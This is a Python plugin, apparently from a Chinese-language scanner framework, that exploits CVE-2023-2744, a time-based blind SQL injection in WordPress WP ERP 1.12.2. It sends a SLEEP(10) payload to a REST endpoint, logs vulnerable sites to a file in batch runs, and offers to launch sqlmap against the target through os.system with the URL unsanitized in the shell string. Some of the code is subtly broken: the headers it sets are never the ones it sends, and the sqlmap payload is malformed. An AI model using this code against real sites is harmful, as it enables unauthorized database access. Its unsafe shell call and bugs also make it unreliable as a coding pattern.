#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import time
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
import requests,urllib3
from rich.prompt import Prompt
urllib3.disable_warnings()

class Cve_2023_2744:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        url2 = url + '/wp-json/erp/v1/accounting/v1/people?type=' + "customer') AND (SELECT 1 FROM (SELECT SLEEP(10))x) AND ('x'='x"
        payload = "customer') AND (SELECT 1 FROM (SELECT SLEEP(10))x) AND ('x'='x"
        start_time = time.time()

        try:
            req = requests.post(url2,verify=self.verify,proxies=self.proxy,headers=self.header)
        except Exception:
            if not self.batch:
                OutPrintInfo("WordPress", "不存在WordPress WP ERP 1.12.2 SQL Injection")
            return
        end_time = time.time()
        response_time = end_time - start_time
        if response_time > 10:
            if not self.batch:
                OutPrintInfoSuc("WordPress", f"存在WordPress WP ERP 1.12.2 SQL Injection")
                OutPrintInfo("WordPress", url2)
                OutPrintInfo("WordPress",f"Payload {payload}")
                OutPrintInfo("WordPress",f"响应时间 {str(response_time)}")
            else:
                OutPrintInfoSuc("WordPress", f"存在ERP 1.12.2 SQL注入 {url}/wp-json/erp/v1/accounting/v1/people?type=customer') AND (SELECT 1 FROM (SELECT SLEEP(10))x) AND ('x'='x")
                with open("./result/wordpress_2023_2744.txt","a") as w:
                    w.write(f"{url}/wp-json/erp/v1/accounting/v1/people?type=customer') AND (SELECT 1 FROM (SELECT SLEEP(10))x) AND ('x'='x\n")
                return True
        else:
            if not self.batch:
                OutPrintInfo("WordPress", "不存在WordPress WP ERP 1.12.2 SQL Injection")
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("WordPress", "开始检测WordPress WP ERP 1.12.2 SQL Injection...")
        if self.send_payload(url):
            if not self.batch:
                choose = Prompt.ask("[b yellow]是否调用sqlmap执行检测([b red]y/n[/b red])")
                if choose == "y":
                    import os
                    try:
                        dir = os.getcwd()
                        OutPrintInfo("SqlMap",f'[b bright_red]Query[/b bright_red]: \n[b magenta]sqlmap -u "{url}/wp-json/erp/v1/accounting/v1/people?type=customer\') AND (SELECT 1 FROM (SELECT *)x) AND (\'x\'=\'x" --output-dir={dir}/result/ --batch')
                        os.system(f"sqlmap -u \"{url}/wp-json/erp/v1/accounting/v1/people?type=customer\') AND (SELECT 1 FROM (SELECT *)x) AND (\'x\'=\'x\" --output-dir={dir}/result/ --batch")
                    except Exception as e:
                        OutPrintInfoErr(e)
        if not self.batch:
            OutPrintInfo("WordPress", "WordPress WP ERP 1.12.2 SQL Injection检测结束")
